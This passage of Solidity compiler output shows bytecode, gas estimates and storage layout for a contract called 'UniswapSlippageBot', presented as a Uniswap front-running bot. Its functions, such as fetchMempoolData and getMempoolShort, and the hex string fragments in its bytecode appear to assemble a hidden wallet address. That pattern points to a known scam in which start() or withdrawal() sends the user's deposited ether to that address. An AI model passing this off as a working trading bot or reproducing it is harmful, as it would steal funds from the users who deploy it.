PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x4B4 JUMPI POP PUSH1 0x39 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4C0 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST PUSH1 0x61 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x4E4 JUMPI POP PUSH1 0x66 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4F4 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x518 JUMPI POP PUSH1 0x46 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x528 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x54C JUMPI POP PUSH1 0x39 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x558 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST PUSH1 0x10 DUP4 MUL DUP3 ADD SWAP4 SWAP1 SWAP4 ADD SWAP3 PUSH1 0x2 ADD PUSH2 0x3E4 JUMP JUMPDEST POP SWAP2 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST SELFBALANCE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x3078393065 PUSH1 0xD8 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x4 DUP2 MSTORE PUSH4 0x18A13119 PUSH1 0xE1 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x6 DUP2 MSTORE PUSH6 0x70726A646A7 PUSH1 0xD3 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x304639463 PUSH1 0xDC SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x18229A2219 PUSH1 0xD9 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x3231653863 PUSH1 0xD8 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x4 DUP2 MSTORE PUSH4 0x33433731 PUSH1 0xE0 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x8 DUP2 MSTORE PUSH8 0x3330303735413165 PUSH1 0xC0 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMP GT 0xAD STOP KECCAK256 0xCD 0xBB MOD 0xB2 DUP4 SWAP13 SHR 0x28 0x4D GASLIMIT PUSH6 0xDB587C53FC00 SHL 0xDE MLOAD PUSH28 0x7F95DED56EBB64736F6C634300060600333078376132353064353633 ADDRESS TIMESTAMP CALLVALUE PUSH4 0x46353339 CALLDATACOPY CALLER CODECOPY PUSH5 0x4632433564 COINBASE PUSH4 0x62346336 CALLDATALOAD CODECOPY CHAINID ORIGIN CALLVALUE CODESIZE CODESIZE DIFFICULTY ADDRESS PUSH25 0x43303261614133396232323346453844304130653543344632 CALLDATACOPY PUSH6 0x414439303833 NUMBER CALLDATACOPY CALLDATALOAD CALLDATASIZE NUMBER PUSH4 0x32000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "341200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "227",
						"withdrawal()": "infinite"
					},
					"internal": {
						"beyond(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct UniswapSlippageBot.slice memory)": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"fetchMempoolData()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getBa()": "17",
						"getMempoolCode()": "infinite",
						"getMempoolHeight()": "infinite",
						"getMempoolLog()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"getMempoolStart()": "infinite",
						"keccak(struct UniswapSlippageBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct UniswapSlippageBot.slice memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "bot.sol:UniswapSlippageBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 9,
						"contract": "bot.sol:UniswapSlippageBot",
						"label": "WETH_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "bot.sol:UniswapSlippageBot",
						"label": "UNISWAP_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "2",
						"type": "t_string_storage"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}